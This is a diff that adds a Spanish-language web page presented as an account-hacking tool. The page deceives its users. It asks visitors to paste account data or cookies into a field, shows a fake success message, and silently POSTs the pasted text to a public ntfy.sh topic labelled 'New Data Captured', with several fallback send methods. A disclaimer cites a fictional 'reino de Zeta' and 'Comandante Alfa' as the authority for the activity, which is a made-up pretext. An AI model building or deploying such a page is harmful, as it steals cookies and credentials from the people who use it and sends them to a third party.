@@ -1,0 +1,298 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sistema de hackeo de Cuentas</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #0c0c0c 0%, #1a1a2e 100%);
+            color: #fff;
+            margin: 0;
+            padding: 20px;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        
+        .container {
+            background: rgba(25, 25, 35, 0.8);
+            backdrop-filter: blur(10px);
+            border-radius: 15px;
+            padding: 30px;
+            width: 90%;
+            max-width: 500px;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.5);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        
+        h1 {
+            text-align: center;
+            color: #ff003c;
+            margin-bottom: 20px;
+            font-size: 24px;
+            text-shadow: 0 0 10px rgba(255, 0, 60, 0.5);
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: bold;
+            color: #00ccff;
+        }
+        
+        textarea {
+            width: 100%;
+            padding: 15px;
+            background: rgba(0, 0, 0, 0.3);
+            border: 1px solid #00ccff;
+            border-radius: 8px;
+            color: #fff;
+            font-size: 16px;
+            resize: vertical;
+            min-height: 100px;
+            box-sizing: border-box;
+        }
+        
+        textarea::placeholder {
+            color: rgba(255, 255, 255, 0.5);
+        }
+        
+        textarea:focus {
+            outline: none;
+            border-color: #ff003c;
+            box-shadow: 0 0 10px rgba(255, 0, 60, 0.5);
+        }
+        
+        button {
+            width: 100%;
+            padding: 15px;
+            background: linear-gradient(90deg, #ff003c 0%, #cc0030 100%);
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        
+        button:hover {
+            background: linear-gradient(90deg, #ff0040 0%, #ff0020 100%);
+            box-shadow: 0 0 15px rgba(255, 0, 60, 0.7);
+            transform: translateY(-2px);
+        }
+        
+        button:active {
+            transform: translateY(0);
+        }
+        
+        .status {
+            margin-top: 20px;
+            text-align: center;
+            font-weight: bold;
+            min-height: 24px;
+        }
+        
+        .success {
+            color: #00ff99;
+        }
+        
+        .error {
+            color: #ff3300;
+        }
+        
+        .disclaimer {
+            margin-top: 25px;
+            padding: 15px;
+            background: rgba(255, 0, 60, 0.1);
+            border-radius: 8px;
+            font-size: 12px;
+            text-align: center;
+            border: 1px solid rgba(255, 0, 60, 0.3);
+        }
+        
+        .instructions {
+            margin-top: 20px;
+            padding: 15px;
+            background: rgba(0, 204, 255, 0.1);
+            border-radius: 8px;
+            font-size: 13px;
+            border: 1px solid rgba(0, 204, 255, 0.3);
+        }
+        
+        .instructions h3 {
+            margin-top: 0;
+            color: #00ccff;
+        }
+        
+        .instructions ul {
+            padding-left: 20px;
+            margin-bottom: 0;
+        }
+        
+        .debug-info {
+            margin-top: 20px;
+            padding: 15px;
+            background: rgba(255, 165, 0, 0.1);
+            border-radius: 8px;
+            font-size: 12px;
+            border: 1px solid rgba(255, 165, 0, 0.3);
+        }
+        
+        .debug-info h3 {
+            margin-top: 0;
+            color: #ff9900;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🔓 INGRESE LOS CARACTERES PARA HACKEAR LA CUENTA 🔓</h1>
+        
+        <div class="form-group">
+            <label for="cookieData">Poner cuenta a hackear:</label>
+            <textarea id="cookieData" placeholder="Ingrese aquí cualquier texto o información de la cuenta..."></textarea>
+        </div>
+        
+        <button id="hackButton">💀 HACKEAR AHORA 💀</button>
+        
+        <div id="status" class="status"></div>
+        
+        <div class="debug-info">
+            <h3>🔧 Información de Depuración:</h3>
+            <p id="requestDetails">Estado: Esperando Hackeo...</p>
+        </div>
+        
+        <div class="instructions">
+            <h3>💡 Información importante:</h3>
+            <ul>A Hackear       </ul>
+        </div>
+        
+        <div class="disclaimer">
+            ⚠️ Este sistema es para uso exclusivo en el reino de Zeta. Toda actividad está autorizada por el Comandante Alfa.
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const cookieData = document.getElementById('cookieData');
+            const hackButton = document.getElementById('hackButton');
+            const status = document.getElementById('status');
+            const requestDetails = document.getElementById('requestDetails');
+            
+            hackButton.addEventListener('click', function() {
+                const data = cookieData.value.trim();
+                
+                if (!data) {
+                    status.textContent = '❌ ERROR: Debe ingresar los caracteres primero';
+                    status.className = 'status error';
+                    return;
+                }
+                
+                status.textContent = '🔄 Enviando datos al servidor...';
+                status.className = 'status';
+                
+                // Configuración del servidor NTFY
+                const ntfyServer = 'https://ntfy.sh';
+                const topic = 'pe9278301';
+                
+                requestDetails.textContent = `Hackeo exitoso `;
+                
+                // SOLUCIÓN: Codificar correctamente los caracteres especiales
+                const encodedData = encodeURIComponent(data);
+                const encodedTitle = encodeURIComponent('Nuevos Datos Capturados');
+                
+                // Método 1: Usando fetch con headers simples (solo caracteres ISO-8859-1)
+                fetch(`${ntfyServer}/${topic}`, {
+                    method: 'POST',
+                    body: data,
+                    headers: {
+                        'Title': 'New Data Captured', // Sin emojis ni caracteres especiales
+                        'Priority': 'urgent'
+                    }
+                })
+                .then(response => {
+                    if (response.ok) {
+                        status.textContent = '✅ ¡ÉXITO! hackeo exitoso';
+                        status.className = 'status success';
+                        cookieData.value = '';
+                        requestDetails.textContent += ' - ✅ Hackeo exitoso';
+                    } else {
+                        throw new Error(`Error HTTP: ${response.status} ${response.statusText}`);
+                    }
+                })
+                .catch(error => {
+                    console.error('Error con fetch:', error);
+                    requestDetails.textContent += ` - ❌ Error: ${error.message}`;
+                    
+                    // Si falla fetch, intentar con XMLHttpRequest
+                    status.textContent = '🔄 Intentando método alternativo...';
+                    
+                    const xhr = new XMLHttpRequest();
+                    xhr.open('POST', `${ntfyServer}/${topic}`, true);
+                    xhr.setRequestHeader('Title', 'New Data Captured'); // Sin caracteres especiales
+                    xhr.setRequestHeader('Priority', 'urgent');
+                    
+                    xhr.onreadystatechange = function() {
+                        if (xhr.readyState === 4) {
+                            if (xhr.status >= 200 && xhr.status < 300) {
+                                status.textContent = '✅ ¡ÉXITO! Los datos han sido enviados.';
+                                status.className = 'status success';
+                                cookieData.value = '';
+                                requestDetails.textContent += ' - ✅ Solicitud exitosa con XHR';
+                            } else {
+                                status.textContent = '❌ ERROR: No se pudo conectar con el servidor';
+                                status.className = 'status error';
+                                requestDetails.textContent += ` - ❌ Error XHR: ${xhr.status} ${xhr.statusText}`;
+                                
+                                // Como último recurso, intentar con una solicitud sin cabeceras problemáticas
+                                tryWithoutHeaders(data, topic);
+                            }
+                        }
+                    };
+                    
+                    xhr.send(data);
+                });
+            });
+            
+            function tryWithoutHeaders(data, topic) {
+                status.textContent = '🔄 Intentando método sin cabeceras...';
+                requestDetails.textContent += ' - Probando método sin cabeceras';
+                
+                // Enviar con fetch pero sin cabeceras problemáticas
+                fetch(`https://ntfy.sh/${topic}`, {
+                    method: 'POST',
+                    body: data
+                })
+                .then(response => {
+                    if (response.ok) {
+                        status.textContent = '✅ ¡ÉXITO! Los datos han sido enviados (sin cabeceras).';
+                        status.className = 'status success';
+                        cookieData.value = '';
+                        requestDetails.textContent += ' - ✅ Solicitud sin cabeceras exitosa';
+                    } else {
+                        status.textContent = '⚠️ Los datos pueden haberse enviado parcialmente';
+                        status.className = 'status success';
+                        cookieData.value = '';
+                        requestDetails.textContent += ' - ⚠️ Respuesta incierta del servidor';
+                    }
+                })
+                .catch(error => {
+                    status.textContent = '❌ ERROR: No se pudo conectar con el servidor';
+                    status.className = 'status error';
+                    requestDetails.textContent += ` - ❌ Error final: ${error.message}`;
+                });
+            }
+        });
+    </script>
+</body>
+</html>
